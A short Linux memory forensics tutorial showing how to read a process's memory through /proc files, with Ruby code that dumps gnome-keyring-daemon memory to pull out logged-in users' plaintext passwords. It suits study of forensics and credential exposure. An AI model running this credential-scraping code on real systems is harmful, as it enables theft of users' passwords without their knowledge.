# Memory Forensic 



## Linux memory

### Dump Linux memory

To dump Linux memory for a specific process to disk, we need the follwoing: 

1. **Get process id \(PID\):** `/proc/\[PID\]/cmdline`
   - _cmdline_ is file holds the complete command line for the process.
2. **Get PID maps:** `/proc/\[PID\]/maps`
   - _maps_ is file containing the currently mapped memory regions and their access permissions.
3. **Get processs memory pages:** `/proc/\[PID\]/mem`
   - _mem_ is a file can be used to access the pages of a process's memory through

#### Case study
Let's assume we want to dump `gnome-keyring-daemon` process's memory to our disk in order to extract the logged-in user(s) password(s) since its stored in as a plan text in memory. Moreover, we know that it comes after "libgck-1" or "libgcrypt" strings in memory. We'll brack that a parts then put it together.

**Get process id \(PID\)**

```ruby
@pids = []
Dir.glob('/proc/*/cmdline').each do |cmdline_file|
  processes_name.each do |process|
    if File.read(cmdline_file).include? "gnome-keyring-daemon"
      @pids << cmdline_file.split('/')[2].to_i  # get the pid number from proc/nnn/cmdline
    end
  end
end
```

**Get PID maps:**

```ruby
@pids_maps = []
@pids.each do |pid|
  # Open and parse maps file for each pid
  File.readlines("/proc/#{pid}/maps").each do |line|
    address, permissions = line.split(' ').first(2)
    # Find addresses in readable process memory pages
    if permissions.match(/^r.*/)
      # Find where pages starts and ends to read, no need to dump the whole memory.
      memory_start, memory_stop = address.split('-').map{|r| r.to_i(16)}
      chunk_size = memory_stop - memory_start
      @pids_maps << {pid: pid, memory_start: memory_start, memory_stop: memory_stop, chunk: chunk_size}
    end
  end
end
```

**Get processs memory pages:**

```ruby
memory_dump = []

@pids_maps.each do |pid|
  begin
    chunk_pointer = File.open("/proc/#{pid[:pid]}/mem", 'rb')   # Open mem file
    chunk_pointer.seek  pid[:memory_start]                      # chunk_pointer.seek(memory_start)
    memory_dump << chunk_pointer
                       .read(pid[:chunk])                       # Read mem file
                       .scan(/\x00{1,2}[[:graph:]]{4,}\x00{1,2}/)    # extract strings between \x00\x00 (the pattern of useful strings)
                       .map{|str|str.gsub(/\x00/, '')}          # remove \x00\x00 from found strings
  rescue Errno::EIO, RangeError
    next
  rescue  Exception => e
    pp e
    pp e.backtrace
  end
end
```








